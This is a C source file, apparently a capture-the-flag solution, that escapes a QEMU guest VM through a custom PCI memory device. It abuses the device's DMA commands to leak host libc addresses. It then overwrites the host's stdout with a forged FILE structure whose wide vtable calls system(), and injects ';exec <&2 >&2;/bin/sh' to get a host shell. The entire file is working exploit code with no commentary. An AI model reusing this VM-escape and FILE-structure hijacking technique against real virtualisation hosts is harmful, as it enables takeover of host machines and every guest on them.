#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

#define dma_addr_t uint64_t

#define PORT_SET_COMMAND   0

#define CMD_STORE_GETKEY   0x10
#define CMD_STORE_PAGE     0x11
#define CMD_STORE_FIN      0x12
#define CMD_LOAD_SETKEY    0x20
#define CMD_LOAD_PAGE      0x21
#define CMD_LOAD_FIN       0x22

#define PIO_BASE 0xc030
#define MMIO_BASE 0xfebd2000

struct _IO_FILE_plus
{
	struct _IO_FILE file;
	const struct _IO_jump_t *vtable;
};

struct _IO_wide_data
{
	wchar_t *_IO_read_ptr;        /* Current read pointer */
	wchar_t *_IO_read_end;        /* End of get area. */
	wchar_t *_IO_read_base;       /* Start of putback+get area. */
	wchar_t *_IO_write_base;      /* Start of put area. */
	wchar_t *_IO_write_ptr;       /* Current put pointer. */
	wchar_t *_IO_write_end;       /* End of put area. */
	wchar_t *_IO_buf_base;        /* Start of reserve area. */
	wchar_t *_IO_buf_end;         /* End of reserve area. */
			  /* The following fields are used to support backing up and undo. */
	wchar_t *_IO_save_base;       /* Pointer to start of non-current get area. */
	wchar_t *_IO_backup_base;     /* Pointer to first valid character of
							                                        backup area */
	wchar_t *_IO_save_end;        /* Pointer to end of non-current get area. */

	__mbstate_t _IO_state;
	__mbstate_t _IO_last_state;
	char _codecvt[0x70];

	wchar_t _shortbuf[1];

	const struct _IO_jump_t *_wide_vtable;
};


struct reg_mmio {
	dma_addr_t sdma_addr;
	uint32_t key;
	union {
		uint32_t len;
		uint32_t pgoff;
	};
	uint32_t addr_ram_low;
};

struct pcidrv_info {
	struct pci_dev *pdev;

	unsigned long pio_base,  pio_flags,  pio_length;
	unsigned long mmio_base, mmio_flags, mmio_length;
	unsigned long ram_base,  ram_flags,  ram_length;

	struct reg_mmio *mmio;
	void *ram;
};
/*
struct PCIMemoDevHdr {
	dma_addr_t sdma_addr;
	uint32_t key;
	union {
		uint32_t len;
		uint32_t pgoff;
	};
};

struct PCIMemoDevState {
	PCIDevice parent_obj;

	const bool prefetch_ram;
	const uint32_t limit_pages;

	MemoryRegion portio;
	MemoryRegion mmio;
	MemoryRegion ram;

	struct PCIMemoDevHdr reg_mmio;
	void *addr_ram;
	uint8_t cmd_result;
	uint8_t int_flag;

	int data_fd;
	uint32_t *list_base, *list_cur;
	uint32_t key, count;
};
*/

uint64_t virt2phys(uintptr_t *addr){
	static int map_fd = -1;
	uint64_t base;
	if(map_fd < 0)
		map_fd = open("/proc/self/pagemap", O_RDONLY);

	lseek(map_fd, sizeof(uintptr_t) * ((uint64_t)addr >> 12), SEEK_SET);
	if(read(map_fd, &base, sizeof(uintptr_t)) < sizeof(uintptr_t))
		return -1;

	if(!(base & (1UL<<63)))
		return -1;

	base <<= 12;
	printf("virt : 0x%016lx -> phys : 0x%016lx\n", (uint64_t)addr & ~((1<<12)-1), base);

	return base | ((uint64_t)addr & ((1<<12)-1));
}


int main(){
	int pio_fd = -1;
	int mmio_fd = -1;

	uint64_t physaddr = 0;
	
	struct reg_mmio *mmio_ptr = NULL; 
	void *shared_ptr = NULL;
	setbuf(stdout, NULL);

	if (ioperm(PIO_BASE, 4, 1) != 0) perror("ioperm");
	if ((pio_fd =  open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR)) < 0) perror("1open");
	if ((mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource1", O_RDWR)) < 0) perror("2open");

	if ((mmio_ptr = (struct reg_mmio *)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0)) < 0) perror("1mmap");
	if ((shared_ptr = (void *)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0)) < 0) perror("2mmap");

	((int *)shared_ptr)[0] = 0xbeef;
	physaddr = virt2phys(shared_ptr);
	mmio_ptr->sdma_addr = physaddr;

	uint32_t store_getkey(uint32_t len) {
		/* fix the buffer */
		uint8_t buf = CMD_STORE_GETKEY;
		mmio_ptr->len = len;

		pwrite(pio_fd, &buf, 1, PORT_SET_COMMAND);
		//write(pio_fd, buf, 1);
		return mmio_ptr->key;
	}
	void store_page(uintptr_t addr, uint32_t pgoff) {
		uint8_t buf = CMD_STORE_PAGE;
		mmio_ptr->sdma_addr = addr;
		mmio_ptr->pgoff = pgoff;
		pwrite(pio_fd, &buf, 1, PORT_SET_COMMAND);
	}
	void store_fin(){
		uint8_t buf = CMD_STORE_FIN;
		pwrite(pio_fd, &buf, 1, PORT_SET_COMMAND);
	}
	uint32_t load_setkey(uint32_t key){
		uint8_t buf = CMD_LOAD_SETKEY;
		mmio_ptr->key = key;
		pwrite(pio_fd, &buf, 1, PORT_SET_COMMAND);
		return mmio_ptr->len;
	}
	uint32_t load_page(uintptr_t addr) {
		uint8_t buf = CMD_LOAD_PAGE;
		mmio_ptr->sdma_addr = addr;
		pwrite(pio_fd, &buf, 1, PORT_SET_COMMAND);
		return mmio_ptr->pgoff;
	}
	
	void load_fin(){
		uint8_t buf = CMD_LOAD_FIN;
		pwrite(pio_fd, &buf, 1, PORT_SET_COMMAND);
	}
	printf("addr_ram(low): 0x%x\n", mmio_ptr->addr_ram_low);
	uint32_t key = store_getkey(7);
	printf("key: %x\n", key);

	((uint64_t *) shared_ptr)[0] = 0x1122334455667788;

	//mmio_ptr->sdma_addr = physaddr;
	//mmio_ptr->sdma_addr = -1;
	store_page(-1, 0xdead);

	uint32_t orig = mmio_ptr->addr_ram_low;
	//mmio_ptr->addr_ram_low = 0xdeadbeef;
	//mmio_ptr->addr_ram_low = orig +0xbeef;
	printf("addr_ram(low): 0x%x\n", mmio_ptr->addr_ram_low);
	store_fin();

	load_setkey(key);
	//mmio_ptr->sdma_addr = 0xababcdcd;
	//
	//mmio_ptr->sdma_addr = physaddr;
	uint32_t bin[0x10];
	for ( int i = 0; i < 0x10; i++) {
		bin[i] = load_page(physaddr); 
		//printf("bin[%d]: %x\n", i, bin[i]);
	}
	unsigned long leak = bin[12] | (bin[13] << 32);
	printf("leak: 0x%lx\n", leak);
	mmio_ptr->addr_ram_low = leak & 0xff000000;
	load_page(physaddr); 

	unsigned long leak2 = ((unsigned long *) shared_ptr)[0x8a0/8];
	printf("leak2: 0x%lx\n", leak2);
	mmio_ptr->addr_ram_low = leak2 & 0xff000000;
	load_page(physaddr); 

	unsigned long leak3 = ((unsigned long *) shared_ptr)[0x8a0/8];
	printf("leak3: 0x%lx\n", leak3);
	
	/*
	for (int i = 0; i < 0x100; i++) {
		if ( ((uint64_t *) shared_ptr)[i] != 0)
			printf("%03x: %lx\n", i, ((uint64_t *) shared_ptr)[i]);
	}
	*/
	unsigned long base = leak3 - 0x219c80;
	unsigned long libc_got = base + 0x219000;
	unsigned long libc_system = base + 0x50d70;
	unsigned long libc_wfile_jumps = base + 0x2160c0;

	printf("base: 0x%lx\n", base);
	printf("libc_got: 0x%lx\n", libc_got);

	mmio_ptr->addr_ram_low = (libc_got+0x1000) & 0xfffff000;
	load_page(physaddr); 

	load_fin();

	uintptr_t addr_ram = libc_got + 0x1000 + 0x780;
	// edit me
	memset(shared_ptr+0x780, 0xcc, 0xe0);  //stdout
	//memset(shared_ptr+0x680, 0xbb, 8);  //io_list_all
	struct fake_files {
		struct _IO_FILE_plus file_plus;
		struct _IO_wide_data wide_data;
		uintptr_t wide_vtable[21];
		uint64_t lock;
	} ff = {
		.file_plus = {
			.file = {
				._flags     = 0xfbad2086 & ~0x80a,
				._lock      = (void*)&((struct fake_files*)addr_ram)->lock,
				._wide_data = (void*)&((struct fake_files*)addr_ram)->wide_data,
				._mode      = 1,
			},
			.vtable = (void*)libc_wfile_jumps,
		},
		.wide_data = {
			._IO_write_base = (void*)0,
			._IO_write_ptr  = (void*)1,
			._wide_vtable   = (void*)&((struct fake_files*)addr_ram)->wide_vtable,
		},
		.wide_vtable = {
			[13] = libc_system,
		},
		.lock = 0,
	};

	memcpy(shared_ptr+0x780, &ff, sizeof(ff));
	strcpy(shared_ptr+0x780+4, ";exec <&2 >&2;/bin/sh");

	store_getkey(2);
	mmio_ptr->addr_ram_low = (libc_got+0x1000) & 0xfffff000;
	store_page(physaddr, 0xbeef);
	store_fin();

	system("reboot");

}
